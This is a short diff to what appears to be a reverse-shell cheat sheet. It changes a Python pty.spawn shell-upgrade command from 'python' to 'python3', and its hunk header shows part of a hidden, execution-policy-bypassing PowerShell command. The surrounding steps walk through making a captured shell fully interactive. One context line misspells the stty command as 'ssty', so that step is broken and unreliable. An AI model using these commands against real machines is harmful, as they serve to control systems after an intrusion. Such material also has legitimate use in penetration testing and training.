@@ -34,7 +34,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object Syst
 \033[92m[+ Python Shell Upgrade]\033[0m
 
 \033[94m# Drop to BASH shell for compatibility, then make connection\033[0m
-python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 Ctrl-z
 ssty raw -echo
 fg
